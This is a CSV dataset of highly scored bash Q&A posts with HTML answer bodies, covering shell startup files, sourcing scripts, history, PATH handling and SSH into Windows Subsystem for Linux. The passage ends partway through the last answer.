Title,Id,Tags,Score,Body
"What does 'source' do?","46139","<bash><shell><documentation>","654","<p><a href=""http://ss64.com/bash/source.html"" rel=""noreferrer""><code>source</code></a> is a bash shell built-in command that executes the content of the file passed as argument, <strong><em>in the current shell</em></strong>. It has a synonym in <code>.</code> (period).</p>

<blockquote>
  <p>Syntax</p>

<pre><code>. filename [arguments]

source filename [arguments]
</code></pre>
</blockquote>
"
"Difference between .bashrc and .bash_profile","183870","<bash><bashrc><.bash-profile>","496","<p>Traditionally, when you log into a Unix system, the system would start one program for you. That program is a shell, i.e., a program designed to start other programs. It's a command line shell: you start another program by typing its name. The default shell, a Bourne shell, reads commands from <code>~/.profile</code> when it is invoked as the login shell.</p>

<p>Bash is a Bourne-like shell. It reads commands from <code>~/.bash_profile</code> when it is invoked as the login shell, and if that file doesn't exist¹, it tries reading <code>~/.profile</code> instead.</p>

<p>You can invoke a shell directly at any time, for example by launching a terminal emulator inside a GUI environment. If the shell is not a login shell, it doesn't read <code>~/.profile</code>. When you start bash as an interactive shell (i.e., not to run a script), it reads <code>~/.bashrc</code> (except when invoked as a login shell, then it only reads <code>~/.bash_profile</code> or <code>~/.profile</code>.</p>

<p>Therefore:</p>

<ul>
<li><p><code>~/.profile</code> is the place to put stuff that applies to your whole session, such as programs that you want to start when you log in (but not graphical programs, they go into a different file), and environment variable definitions.</p></li>
<li><p><code>~/.bashrc</code> is the place to put stuff that applies only to bash itself, such as alias and function definitions, shell options, and prompt settings. (You could also put key bindings there, but for bash they normally go into <code>~/.inputrc</code>.)</p></li>
<li><p><code>~/.bash_profile</code> can be used instead of <code>~/.profile</code>, but it is read by bash only, not by any other shell. (This is mostly a concern if you want your initialization files to work on multiple machines and your login shell isn't bash on all of them.) This is a logical place to include <code>~/.bashrc</code> if the shell is interactive. I recommend the following contents in <code>~/.bash_profile</code>:</p>

<pre><code>if [ -r ~/.profile ]; then . ~/.profile; fi
case ""$-"" in *i*) if [ -r ~/.bashrc ]; then . ~/.bashrc; fi;; esac
</code></pre></li>
</ul>

<p>On modern unices, there's an added complication related to <code>~/.profile</code>. If you log in in a graphical environment (that is, if the program where you type your password is running in graphics mode), you don't automatically get a login shell that reads <code>~/.profile</code>. Depending on the graphical login program, on the window manager or desktop environment you run afterwards, and on how your distribution configured these programs, your <code>~/.profile</code> may or may not be read. If it's not, there's usually another place where you can define environment variables and programs to launch when you log in, but there is unfortunately no standard location.</p>

<p>Note that you may see here and there recommendations to either put environment variable definitions in <code>~/.bashrc</code> or always launch login shells in terminals. Both are bad ideas. The most common problem with either of these ideas is that your environment variables will only be set in programs launched via the terminal, not in programs started directly with an icon or menu or keyboard shortcut.</p>

<p>¹ <sub> For completeness, by request: if <code>.bash_profile</code> doesn't exist, bash also tries <code>.bash_login</code> before falling back to <code>.profile</code>. Feel free to forget it exists. </sub>  </p>
"
"What is the difference between executing a Bash script vs sourcing it?","176783","<linux><bash><script>","350","<p><strong>Sourcing</strong> a script will run the commands in the <em>current</em> shell process. </p>

<p><strong>Executing</strong> a script will run the commands in a <em>new</em> shell process. </p>

<p>Use source if you want the script to change the environment in your currently running shell. use execute otherwise.</p>

<p>If you are still confused, please read on. </p>

<h2>Terminology</h2>

<p>To clarify some common confusion about the syntax to execute and the syntax to source:</p>

<pre><code>./myscript
</code></pre>

<p>This will <strong>execute</strong> <code>myscript</code> provided that the file is executable and located in the current directory. The leading dot and slash (<code>./</code>) denotes the current directory. This is necessary because the current directory is usually not (and usually should not be) in <code>$PATH</code>.</p>

<pre><code>myscript
</code></pre>

<p>This will <strong>execute</strong> <code>myscript</code> if the file is executable and located in some directory in <code>$PATH</code>.</p>

<pre><code>source myscript
</code></pre>

<p>This will <strong>source</strong> <code>myscript</code>. The file need not be executable but it must be a valid shell script. The file can be in current directory or in a directory in <code>$PATH</code>.</p>

<pre><code>. myscript
</code></pre>

<p>This will also <strong>source</strong> <code>myscript</code>. This ""spelling"" is the official one as defined by <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#dot"" rel=""noreferrer"">POSIX</a>. Bash defined <code>source</code> as an alias to the dot.</p>

<h2>Demonstration</h2>

<p>Consider <code>myscript.sh</code> with following content:</p>

<pre><code>#!/bin/sh
# demonstrate setting a variable
echo ""foo: ""$(env | grep FOO)
export FOO=foo
echo ""foo: ""$(env | grep FOO)
# demonstrate changing of working directory
echo ""PWD: ""$PWD
cd somedir
echo ""PWD: ""$PWD
</code></pre>

<p>Before we execute the script first we check the current environment:</p>

<pre><code>$ env | grep FOO
$ echo $PWD
/home/lesmana
</code></pre>

<p>The variable <code>FOO</code> is not defined and we are in the home directory.</p>

<p>Now we <strong>execute</strong> the file:</p>

<pre><code>$ ./myscript.sh
foo:
foo: FOO=foo
PWD: /home/lesmana
PWD: /home/lesmana/somedir
</code></pre>

<p>Check the environment again:</p>

<pre><code>$ env | grep FOO
$ echo $PWD
/home/lesmana
</code></pre>

<p>The variable <code>FOO</code> is not set and the working directory did not change.</p>

<p>The script output clearly shows that the variable was set and the directory was changed. The check afterwards show that the variable is not set and the directory not changed. What happened? The changes were made in a <em>new</em> shell. The <em>current</em> shell spawned a <em>new</em> shell to run the script. The script is running in the new shell and all changes to the environment take effect in the new shell. After the script is done the new shell is destroyed. All changes to the environment in the new shell are destroyed with the new shell. Only the output text is printed in the current shell.</p>

<p>Now we <strong>source</strong> the file:</p>

<pre><code>$ source myscript.sh
foo:
foo: FOO=foo
PWD: /home/lesmana
PWD: /home/lesmana/somedir
</code></pre>

<p>Check the environment again:</p>

<pre><code>$ env | grep FOO
FOO=foo
$ echo $PWD
/home/lesmana/somedir
</code></pre>

<p>The variable FOO is set and the working directory has changed.</p>

<p>Sourcing the script does not create a new shell. All commands are run in the current shell and changes to the environment take effect in the current shell.</p>

<p>Note that in this simple example the output of executing is the same as sourcing the script. This is not necessarily always the case.</p>

<h2>Another Demonstration</h2>

<p>Consider following script <code>pid.sh</code>:</p>

<pre><code>#!/bin/sh
echo $$
</code></pre>

<p>(the special variable <code>$$</code> expands to the PID of the current running shell process)</p>

<p>First print the PID of the current shell:</p>

<pre><code>$ echo $$
25009
</code></pre>

<p>Source the script:</p>

<pre><code>$ source pid.sh
25009
</code></pre>

<p>Execute the script, note the PID:</p>

<pre><code>$ ./pid.sh
25011
</code></pre>

<p>Source again:</p>

<pre><code>$ source pid.sh
25009
</code></pre>

<p>Execute again:</p>

<pre><code>$ ./pid.sh
25013
</code></pre>

<p>You can see that sourcing the script runs in the same process while executing the script creates a new process everytime. That new process is the <em>new</em> shell which was created for the execution of the script. Sourcing the script does not create a new shell and thus the PID stays the same.</p>

<h2>Summary</h2>

<p>Both sourcing and executing the script will run the commands in the script line by line, as if you typed those commands by hand line by line.</p>

<p>The differences are:</p>

<ul>
<li>When you <em>execute</em> the script you are opening a <em>new</em> shell, type the commands in the new shell, copy the output back to your current shell, then close the new shell. Any changes to environment will take effect only in the new shell and will be lost once the new shell is closed.</li>
<li>When you <em>source</em> the script you are typing the commands in your <em>current</em> shell. Any changes to the environment will take effect and stay in your current shell.</li>
</ul>

<p>Use source if you want the script to change the environment in your currently running shell. use execute otherwise.</p>

<hr>

<p>See also:</p>

<ul>
<li><a href=""https://stackoverflow.com/questions/6331075/why-do-you-need-dot-slash-before-script-name-to-run-it-in-bash"">https://stackoverflow.com/questions/6331075/why-do-you-need-dot-slash-before-script-name-to-run-it-in-bash</a></li>
<li><a href=""https://askubuntu.com/questions/182012/is-there-a-difference-between-and-source-in-bash-after-all"">https://askubuntu.com/questions/182012/is-there-a-difference-between-and-source-in-bash-after-all</a></li>
</ul>
"
"How do I add text to the beginning of a file in Bash?","246837","<bash>","349","<p><strong>Linux :</strong></p>
<pre><code>echo 'task goes here' | cat - todo.txt &gt; temp &amp;&amp; mv temp todo.txt
</code></pre>
<p>or</p>
<pre><code>sed -i '1s/^/task goes here\n/' todo.txt
</code></pre>
<p>or</p>
<pre><code>sed -i '1itask goes here' todo.txt
</code></pre>
<p><strong>Mac os x :</strong></p>
<pre><code>sed -i '.bak' '1s/^/task goes here\'$'\n/g' todo.txt
</code></pre>
<p>or</p>
<pre><code>echo -e &quot;task goes here\n$(cat todo.txt)&quot; &gt; todo.txt
</code></pre>
<p>or</p>
<pre><code>echo 'task goes here' | cat - todo.txt &gt; temp &amp;&amp; mv temp todo.txt
</code></pre>
"
"How can I search the bash history and rerun a command?","7414","<unix><bash>","328","<p>Type <kbd>Ctrl</kbd> <kbd>R</kbd> at the command line and start typing the previous command.  Once a result appears keep hitting <kbd>Ctrl</kbd> <kbd>R</kbd> to see other matches.  When the command you want appears, simply press <kbd>Enter</kbd></p>

<p>Note that while <kbd>Ctrl</kbd> <kbd>R</kbd> is the default, if you wanted the command (<code>reverse-search-history</code>) to be bound to <kbd>Ctrl</kbd> <kbd>T</kbd> you could configure that with the following:</p>

<pre>
bind '""\C-t"": reverse-search-history'
</pre>

<p>There are a whole host of other readline bindable commands that are available to you as well.  Take a look at the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Bindable-Readline-Commands"" rel=""noreferrer""><code>bash</code> man page</a>.</p>

<p>Bash has many facilities to search and access interactive command history.  The most basic of which is the <code>history</code> builtin.  Typing just:</p>

<pre>
$ history
</pre>

<p>Will print a list of commands along with a numeric index, like:</p>

<pre>
$ history
1 clear
2 ls -al
3 vim ~/somefile.txt
4 history
$
</pre>

<p>You can then execute any of these commands using their numeric index by prefacing the index with a single <code>!</code>, as <a href=""https://superuser.com/users/2681/mitch"">Mitch</a> pointed out:</p>

<pre>
$ !1
</pre>

<p>Will execute the <code>clear</code> command.  The history builtin has many features itself, you can see more in the <code>bash</code> and <code>history</code> man pages.</p>

<p>You can also specify relative negative offsets when using the <code>!</code> designator, so using our history list above, if we wanted to execute <code>vim</code> again, we could do:</p>

<pre>
$ !-2
</pre>

<p>Which is basically telling bash to execute the command you ran ""two commands ago.""  To run the previous command in the history list, we can just use <code>!!</code> (which is just shorthand for <code>!-1</code>).</p>

<p>The <code>!</code> designator doesn't limit you to numerically specifying which command to run. <a href=""https://superuser.com/users/770/hayalci"">hayalci</a> showed that you can instruct <code>bash</code> to execute a command based on either the text it begins with (using <code>!</code>) or text within the command itself (using <code>!?</code>).  Again, using our example history list above, if we wanted to execute <code>clear</code> again, all we need to do is type:</p>

<pre>
$ !cl
</pre>

<p>and press <kbd>Enter</kbd>.  And what about <code>vim</code>?  That is as simple as:</p>

<pre>
$ !?some
</pre>

<p>The most important point from <a href=""https://superuser.com/users/770/hayalci"">hayalci</a>'s response is the call to the <code>shopt</code> builtin:</p>

<pre>
$ shopt -s histverify
</pre>

<p>This will enable history verification so that commands that are matched by the <code>!</code>, <code>!!</code>, and <code>!?</code> designators are not blindly executed, but instead filled in on the command line so you can ensure they will do no evil before executing them.  This is even more important when you are executing commands as the root user.  This option can be set in your <code>.bashrc</code> startup file so that it is set whenever you log in.</p>

<p>As has already been pointed out, all of this information can be gleaned from the <a href=""http://www.gnu.org/software/bash/manual/bashref.html"" rel=""noreferrer""><code>bash</code> man page</a>.  For the !, !!, and !? designators, take a look at Section <a href=""http://www.gnu.org/software/bash/manual/bashref.html#History-Interaction"" rel=""noreferrer"">9.3 History Expansion</a>.</p>
"
"Go back to previous directory in shell","113219","<linux><command-line><bash>","324","<p><code>cd -</code> (goes back to previous directory)</p>

<p>If you want to be able to go to the other previous directories, this is not possible out of the box. But check this script and instructions:</p>

<p><a href=""http://linuxgazette.net/109/marinov.html""><strong>History of visited directories in BASH</strong></a></p>

<blockquote>
  <p>The cd command works as usual. The new
  feature is the history of the last 10
  directories and the cd command
  expanded to display and access it. cd
  -- (or simply pressing ctrl+w) shows the history. In front of every
  directory name you see a number. cd
  -num with the number you want jumps to the corresponding directory from the
  history.</p>
</blockquote>
"
"Bash: Iterating over lines in a variable","284187","<bash>","282","<p>With bash, if you want to embed newlines in a string, enclose the string with <code>$''</code>:</p>

<pre><code>$ list=""One\ntwo\nthree\nfour""
$ echo ""$list""
One\ntwo\nthree\nfour
$ list=$'One\ntwo\nthree\nfour'
$ echo ""$list""
One
two
three
four
</code></pre>

<p>And if you have such a string already in a variable, you can read it line-by-line with:</p>

<pre><code>while IFS= read -r line; do
    echo ""... $line ...""
done &lt;&lt;&lt; ""$list""
</code></pre>
"
"In bash, how do I escape an exclamation mark?","133780","<bash><syntax><escape-characters>","210","<p>Since you do not depend on bash to expand variables in your commit message you could use single quotes instead. Strings in single quotes are not expanded by bash.</p>

<pre><code>bzr commit -m 'This does work!' 
</code></pre>
"
"Using watch with pipes","140461","<bash><grep><tail><watch>","206","<p>Surround the command with quotes</p>

<pre><code>watch -n 1 'tail -n 200 log/site_dev.log | fgrep Doctrine'
</code></pre>
"
"Why does Ctrl + V not paste in Bash (Linux shell)?","421463","<linux><bash><keyboard-shortcuts><copy-paste><clipboard>","202","<p>In the days of physical <a href=""http://en.wikipedia.org/wiki/Computer_terminal"" rel=""noreferrer"" title=""Computer terminal &ndash; Wikipedia"">terminals</a>, session-wide clipboards did not exist, only few programs supported internal copy/paste &ndash; often under the name of ""buffers"" or ""kill rings"" &ndash; and used various different keystrokes. For example, the <em>bash</em> shell uses <kbd>Ctrl</kbd><kbd>K</kbd> or <kbd>Ctrl</kbd><kbd>U</kbd> to ""kill"" (cut), <kbd>Ctrl</kbd><kbd>Y</kbd> to ""yank"" (paste); this comes from <a href=""http://www.emacswiki.org/emacs/KillingAndYanking"" rel=""noreferrer"" title=""Killing And Yanking &ndash; Emacs wiki"">the <em>emacs</em> editor</a>.</p>

<p><kbd>Ctrl</kbd><kbd>C</kbd> almost everywhere in Unix was the <a href=""http://en.wikipedia.org/wiki/Control-C#In_command-line_environments"" rel=""noreferrer"" title=""Control-C in command line environments &ndash; Wikipedia"">""interrupt"" key</a>, used to cancel the current program or operation. The <kbd>Ctrl</kbd><kbd>V</kbd> key often meant ""verbatim insert"" &ndash; that is, insert the following character literally without performing any associated action. For example, a normal <kbd>Esc</kbd> switches to command mode in the <em>vi</em> editor, but <kbd>Ctrl</kbd><kbd>V</kbd>, <kbd>Esc</kbd> will insert the <code>ESC</code> character into the document.</p>



<p>The use of <kbd>Ctrl</kbd><kbd>C</kbd> to copy and <kbd>Ctrl</kbd><kbd>V</kbd> to paste from session-wide clipboard was introduced by Mac OS in 1983 and Microsoft Windows 3.x in 1990. (Earlier Windows versions (1.x and 2.x), as well as IBM OS/2, only supported the <a href=""http://en.wikipedia.org/wiki/IBM_Common_User_Access"" rel=""noreferrer"" title=""IBM Common User Access &ndash; Wikipedia"">IBM CUA</a> keys <kbd>Ctrl</kbd><kbd>Ins</kbd> to copy and <kbd>Shift</kbd><kbd>Ins</kbd> to paste; these shortcuts remain supported by all Windows versions.)</p>

<p>When GUIs with clipboard support finally reached Unix, the <kbd>Ctrl</kbd> keypresses were already in use by many terminal programs. In addition, the X graphical interface had somewhat <a href=""http://www.jwz.org/doc/x-cut-and-paste.html"" rel=""noreferrer"" title=""X Selections, Cut Buffers, and Kill Rings &ndash; jwz"">different mechanisms</a>: ""selections"" and ""cut buffers"". Even now you can select text in one program and insert it using the middle mouse button, without any explicit copy action.</p>

<p>In short, by the time Xterm and GNOME Terminal were written (I'm guessing you use the latter), <kbd>Ctrl</kbd><kbd>V</kbd> <em>already had</em> a completely different meaning for many years and could not be changed. In addition, an alternative method of copying text &ndash; the ""selection"" &ndash; was already present in X11, so explicit copy/paste action was probably considered not as important as it would be in Windows. This means that different keyboard shortcuts had to be selected &ndash; for example, most modern terminal programs, like GNOME Terminal, use <kbd>Ctrl</kbd><kbd>Shift</kbd><kbd>C</kbd> and <kbd>Ctrl</kbd><kbd>Shift</kbd><kbd>V</kbd>. (If you use Xterm, the same shortcuts can be added manually using the <em>XTerm*vt100*translations</em> Xresource. Rxvt does not have such an option.)</p>

<p>(Most X11 toolkits also support the CUA ""copy"" and ""paste"" keys, which do not conflict with terminal programs. Unfortunately, the implementations are rather inconsistent &ndash; <kbd>Ctrl</kbd><kbd>Ins</kbd> copies to the ""clipboard"" in most programs (GTK, Qt4, but ignored by Xaw); however, <kbd>Shift</kbd><kbd>Ins</kbd> pastes from the ""primary selection"" in most GTK and Qt4 programs, but from ""clipboard"" in Firefox, and from the now-obsolete cut-buffers in the now-obsolete Xaw.)</p>

<hr>

<p>All that said, some terminals or consoles (in particular, the Windows 10 console) <em>do</em> support these keys. As the Windows console always had a separate ""mark/select"" mode, <kbd>Ctrl</kbd><kbd>C</kbd> now also has two meanings based on context – in regular mode it sends an interrupt, in select mode it copies to clipboard (just like <kbd>Enter</kbd> used to).</p>

<p>Meanwhile, Windows command-line tools never really <em>used</em> <kbd>Ctrl</kbd><kbd>V</kbd> for anything, so it was bound to ""paste"" without disturbing much anything. Doing the same on Unix-like terminals however would be more problematic.</p>
"
"I accidentally typed password into bash command line","736635","<linux><command-line><bash><centos>","197","<p>You can remove just the offending line from <code>bash</code>'s history, instead of clearing the entire history. Simply remove the line with the <code>-d</code> flag, then save (write) the new history with the <code>-w</code> flag:</p>

<pre><code>$ history
351 ssh me@site.com
352 my_password
$ history -d 352
$ history -w
</code></pre>
"
"What to do when Ctrl + C can't kill a process?","243460","<linux><bash><shell>","193","<p>To understand the problem of why <kbd>Ctrl</kbd> + <kbd>C</kbd> does not work, it is very helpful to understand what happens when you press it:</p>

<p>Most shells bind <kbd>Ctrl</kbd> + <kbd>C</kbd> to ""send a <a href=""http://en.wikipedia.org/wiki/Unix_signal#SIGINT"" rel=""noreferrer"">SIGINT</a> signal to the program that currently runs in the foreground"". You can read about the different signals via <a href=""http://man.cx/signal(7)"" rel=""noreferrer"">man signal</a>:</p>

<pre><code> SIGINT        2       Term    Interrupt from keyboard
</code></pre>

<p>Programs can ignore that signal, as they can ignore <a href=""http://en.wikipedia.org/wiki/Unix_signal#SIGTSTP"" rel=""noreferrer"">SIGTSTP</a> as well:</p>

<pre><code> SIGTSTP   18,20,24    Stop    Stop typed at tty
</code></pre>

<p>(Which is what most shells do when you press <kbd>Ctrl</kbd> + <kbd>Z</kbd>, which is why it is not guaranteed to work.)</p>

<p>There are some signals which can not be ignored by the process: <a href=""http://en.wikipedia.org/wiki/Unix_signal#SIGKILL"" rel=""noreferrer"">SIGKILL</a>, <a href=""http://en.wikipedia.org/wiki/Unix_signal#SIGSTOP"" rel=""noreferrer"">SIGSTOP</a> and some others. You can send these signals via the <a href=""http://man.cx/kill"" rel=""noreferrer"">kill</a> command. So, to kill your hanging / zombieying process, just find the <a href=""http://en.wikipedia.org/wiki/Process_identifier"" rel=""noreferrer"">process ID</a> (PID). For example, use <code>pgrep</code> or <code>ps</code> and then <code>kill</code> it:</p>

<pre><code> % kill -9 PID
</code></pre>
"
"What does the 'rc' in `.bashrc`, etc. mean?","173165","<linux><unix><bash><bashrc>","192","<p>It stands for “<a href=""http://en.wikipedia.org/wiki/Run_Commands"">run commands</a>”.</p>

<p>This comes from <a href=""http://en.wikipedia.org/wiki/MIT"">MIT</a>’s <a href=""http://en.wikipedia.org/wiki/Compatible_Time-Sharing_System"">CTSS (Compatible Time-Sharing System)</a> and <a href=""http://en.wikipedia.org/wiki/Multics"">Multics</a>, where the idea that a command processing shell would be an ordinary program originated. CTSS had a program called RUNCOM (for “run commands”) and a script was called “a runcom” in the community where Unix originated, leading to the file extension <code>.rc</code> and generally to the <code>rc</code> abbreviation.</p>

<p><code>rc</code> stuck as a name for any list of commands.</p>
"
"How to access Windows folders from Bash on Ubuntu on Windows","1066261","<windows-10><bash><shell><windows-subsystem-for-linux>","166","<p>You'll find the Windows <code>C:\</code> structure at <code>/mnt/c/</code> in the Bash environment.</p>

<p>Therefore, my Documents folder is at <code>/mnt/c/Users/Ben/Documents/</code>.</p>
"
"Is it possible to `tail -f` the output of `dmesg`?","289239","<bash><command-line><tail>","160","<p>You are probably looking for some combination of messages from various log files. Try:</p>

<pre><code>tail -f /var/log/{messages,kernel,dmesg,syslog}
</code></pre>

<p>…to get a pretty good overview of the system. If you want more or less than that, research what log file the messages you want to see are being placed in.</p>

<p>Also look into using <code>multitail</code> to file and color code and filter multiple log files at once.</p>

<p><strong>Edit:</strong> This wasn't very relevant when I answered this, but as this page gets a lot of hits I'm thought it worth mentioning that newer systems running systemd have this.</p>

<pre><code>dmesg -w
</code></pre>
"
"Remove a certain line from Bash history file","384366","<linux><bash><history><command-history>","160","<p>You need to log out and back in or run <code>history -a</code> so the current history is committed to disk.</p>

<p>Then just edit the file <code>~/.bash_history</code>.</p>
"
"Linux Bash Script, Single Command But Multiple Lines?","508507","<linux><bash><script><tar>","159","<p>All you should need to do is add ""\"" at the end of each line and it should be good to go.</p>

<p>So yours will look like:</p>

<pre><code>tar -cvpzf /share/Recovery/Snapshots/$(hostname)_$(date +%Y%m%d).tar.gz \
    --exclude=/proc \
    --exclude=/lost+found \
    --exclude=/sys \
    --exclude=/mnt \
    --exclude=/media \ 
    --exclude=/dev \
    --exclude=/share/Archive \
    /
</code></pre>

<h3>A Few Shortcuts</h3>

<p>(based on your comment update for setting $HOSTNAME)</p>

<p><strong><code>$HOSTNAME</code></strong></p>

<p>Two options to set that:</p>

<ol>
<li><p>Set HOSTNAME</p>

<blockquote>
  <p>HOSTNAME=$(hostname)</p>
</blockquote></li>
<li><p>Use command substitution (e.g. <code>$(command)</code>)</p>

<p>So it would look like above.  That just makes the command run before using it.</p></li>
</ol>

<p><strong><code>$DATE</code></strong></p>

<p>Another variable avoided would be easily:</p>

<pre><code>$(hostname)_$(date +%Y%m%d).tar.gz \
</code></pre>

<p><code>$ man date</code> will have the formats for the date options, the above is YYYYmmdd</p>
"
"How to ignore certain filenames using ""find""?","397307","<bash><find><regex>","158","<p>You can use the negate (!) feature of find to not match files with specific names:</p>

<pre><code>find . ! -name '*.html' ! -path '*.svn*' -exec grep 'SearchString' {} /dev/null \;
</code></pre>

<p>So if the name ends in .html or contains .svn anywhere in the path, it will not match, and so the exec will not be executed.</p>
"
"Execute a command from another directory in bash","271986","<bash>","154","<p>This is often the best way:</p>

<pre><code>( cd dir ; git init )
</code></pre>

<p>or</p>

<pre><code>( cd dir &amp;&amp; git init )
</code></pre>

<p>It's pretty short and easy to type. It does start a sub-shell, so you can't modify your environment from that, but that doesn't seem to be an issue here.</p>
"
"Case insensitive tab completion in Bash","90196","<macos><command-line><bash><shell>","150","<p>Update the text in <code>/etc/inputrc</code> to include</p>

<pre>set completion-ignore-case on</pre>

<p>Then use <code>^X ^R</code> to reload the configuration.</p>
"
"Where does $PATH get set in OS X 10.6 Snow Leopard?","69130","<macos><command-line><osx-snow-leopard><bash><path>","144","<p>When <code>bash</code> starts it reads the following files every time you login. For the purposes of OS X, this means every time you open a new <code>Terminal</code> window.</p>

<pre><code>/etc/profile
~/.bash_profile
~/.bash_login   (if .bash_profile does not exist)
~/.profile      (if .bash_login does not exist)
</code></pre>

<p>When you start a new shell by typing <code>bash</code> on the command line, it reads <code>.bashrc</code></p>

<p>OS X also uses <a href=""http://developer.apple.com/mac/library/qa/qa2001/qa1067.html""><code>~/.MacOSX/environment.plist</code></a> to set more environment variables, including paths if necessary.</p>

<p>Finally, <code>/etc/paths</code> and <code>/etc/paths.d</code> are read by the shell too.</p>

<hr>

<p><code>/opt/local/bin</code> etc. are added in <code>~/.tcshrc</code> by MacPorts. Also be sure to look in <code>~/.cshrc</code>.</p>
"
"Add directory to $PATH if it's not already there","39751","<bash><script><path>","140","<p>From my .bashrc:</p>

<pre><code>pathadd() {
    if [ -d ""$1"" ] &amp;&amp; [[ "":$PATH:"" != *"":$1:""* ]]; then
        PATH=""${PATH:+""$PATH:""}$1""
    fi
}
</code></pre>

<p>Note that PATH should already be marked as exported, so reexporting is not needed.  This checks whether the directory exists &amp; is a directory before adding it, which you may not care about.</p>

<p>Also, this adds the new directory to the end of the path; to put at the beginning, use <code>PATH=""$1${PATH:+"":$PATH""}""</code> instead of the above <code>PATH=</code> line.</p>
"
"How to use spaces in a bash alias name?","105375","<unix><bash><alias>","136","<p>The <a href=""https://www.gnu.org/software/bash/manual/bash.html#Aliases"">Bash documentation</a> states ""For almost every purpose, shell functions are preferred over aliases."" Here is a shell function that replaces <code>ls</code> and causes output to be piped to <code>more</code> if the argument consists of (only) <code>-la</code>.</p>

<pre><code>ls() {
    if [[ $@ == ""-la"" ]]; then
        command ls -la | more
    else
        command ls ""$@""
    fi
}
</code></pre>

<p>As a one-liner:</p>

<pre><code>ls() { if [[ $@ == ""-la"" ]]; then command ls -la | more; else command ls ""$@""; fi; }
</code></pre>

<p>Automatically pipe output:</p>

<pre><code>ls -la
</code></pre>
"
"How to configure PuTTY so that Home/End/PgUp/PgDn work properly in bash?","94436","<bash><putty>","134","<p>Change the Terminal-type String under the Connection > Data tab from the default “xterm” to “linux”. It worked for me.</p>

<p><img src=""https://i.stack.imgur.com/hAIGk.png"" alt=""enter image description here""></p>
"
"How to delete all files in a directory except some?","529854","<linux><bash><rm>","125","<p>What I do in those cases is to type</p>

<pre><code>rm *
</code></pre>

<p>Then I press <kbd>Ctrl</kbd>+<kbd>X</kbd>,<kbd>*</kbd> to <em>expand</em> <code>*</code> into all visible file names.</p>

<p>Then I can just remove the two files I like to keep from the list and finally execute the command line.</p>
"
"Bash scripting: test for empty directory","352289","<bash>","124","<pre><code>if [ -z ""$(ls -A /path/to/dir)"" ]; then
   echo ""Empty""
else
   echo ""Not Empty""
fi
</code></pre>

<p>Also, it would be cool to check if the directory exists before.</p>
"
"How do I make Bash my default shell on Ubuntu?","46748","<ubuntu><bash><ssh>","124","<p>Use:</p>

<pre><code>chsh
</code></pre>

<p>Enter your password and state the path to the shell you want to use.</p>

<p>For Bash that would be <code>/bin/bash</code>.
For Zsh that would be <code>/usr/bin/zsh</code>.</p>
"
"Does bash have a hook that is run before executing a command?","175799","<command-line><bash><hook>","124","<p>Not natively, but it can be hacked up using the <code>DEBUG</code> trap. <a href=""http://www.twistedmatrix.com/users/glyph/preexec.bash.txt"" rel=""noreferrer"">This code</a> sets up <code>preexec</code> and <code>precmd</code> functions similar to zsh. The command line is passed as a single argument to <code>preexec</code>.</p>

<p>Here is a simplified version of the code to set up a <code>precmd</code> function that is executed before running each command.</p>

<pre><code>preexec () { :; }
preexec_invoke_exec () {
    [ -n ""$COMP_LINE"" ] &amp;&amp; return  # do nothing if completing
    [ ""$BASH_COMMAND"" = ""$PROMPT_COMMAND"" ] &amp;&amp; return # don't cause a preexec for $PROMPT_COMMAND
    local this_command=`HISTTIMEFORMAT= history 1 | sed -e ""s/^[ ]*[0-9]*[ ]*//""`;
    preexec ""$this_command""
}
trap 'preexec_invoke_exec' DEBUG
</code></pre>

<p>This trick is due to <a href=""http://glyf.livejournal.com/63106.html"" rel=""noreferrer"">Glyph Lefkowitz</a>; thanks to <a href=""https://superuser.com/users/9463/bcat"">bcat</a> for locating the original author.</p>

<p>Edit. An updated version of Glyph's hack can be found here: <a href=""https://github.com/rcaloras/bash-preexec"" rel=""noreferrer"">https://github.com/rcaloras/bash-preexec</a></p>
"
"Git Bash Here in ConEmu","454380","<windows><bash><git><conemu>","123","<p>There are a number of ways this can be done in ConEmu as it is so highly configurable, but here's the way I do it.</p>

<ul>
<li>In ConEmu, hit <kbd>Win</kbd><kbd>Alt</kbd><kbd>p</kbd> to open the settings dialog.</li>
<li>Select the Tasks subsection under the Startup node and click the + icon to add a new 'Task'</li>
<li>In the Task Name field enter <code>Git Bash</code>, leave Task Parameters blank and add <code>""C:\Program Files\Git\bin\sh.exe"" --login -i</code> to the Commands section. It should look something like this:</li>
</ul>

<p><a href=""https://i.stack.imgur.com/u3QFq.png""><img src=""https://i.stack.imgur.com/u3QFq.png"" alt=""Git Bash task""></a></p>

<ul>
<li>Now select the Integration node and enter the following under the <strong>ConEmu Here - Explorer menu integration</strong> section: 

<ul>
<li>Menu item: <code>ConEmu Here [Git Bash]</code></li>
<li>Command: <code>/single /cmd {Git Bash}</code></li>
<li>Icon file: <code>C:\Program Files\Git\mingw64\share\git\git-for-windows.ico</code></li>
</ul></li>
<li>Click the Register button</li>
</ul>

<p><a href=""https://i.stack.imgur.com/LiPca.png""><img src=""https://i.stack.imgur.com/LiPca.png"" alt=""Integration""></a></p>

<p>This should add an entry in your right-click context menu (complete with icon). In the Command field you can use any of the <a href=""http://conemu.github.io/en/ConEmuArgs.html"">ConEmu.exe switches</a> (worth checking out for more complete documentation of what you can do - it's pretty powerful).</p>

<p><strong>Note:</strong> If you'd like a Git for Windows icon to appear at the top left of the ConEmu window, use the <code>/icon</code> switch; e.g.,</p>

<pre><code>/icon ""C:\Program Files\Git\mingw64\share\git\git-for-windows.ico"" /single /cmd {Git Bash}
</code></pre>

<p>This only seems to work if it's the first tab open, though.</p>
"
"How can I SSH into ""Bash on Ubuntu on Windows 10""?","1111591","<windows-10><bash><ssh><windows-10-v1607><windows-subsystem-for-linux>","122","<p>I got it to work; here's how.</p>

<p>Uninstalled ssh-server, reinstalled it and made sure it's started with</p>

<pre><code>sudo service ssh --full-restart
</code></pre>

<p>Make sure you turned off root access and added another user in the config file.</p>

<p>I was able to connect to the subsystem on 127.0.0.1:22 as expected. 
I hope this will help you.</p>

<p><img src=""https://i.stack.imgur.com/7hZjW.png"" alt=""Here&#39;s a screenshot.""></p>

<ol>
<li><code>sudo apt-get purge openssh-server</code></li>
<li><code>sudo apt-get install openssh-server</code></li>
<li><code>sudo nano /etc/ssh/sshd_config</code> and disallow root login by setting <code>PermitRootLogin no</code></li>
<li><p>Then add a line beneath it that says:</p>

<p><code>AllowUsers yourusername</code></p>

<p>and make sure <code>PasswordAuthentication</code> is set to <code>yes</code> if you want to login using a password.</p></li>
<li><p>Disable privilege separation by adding/modifying : <code>UsePrivilegeSeparation no</code></p></li>
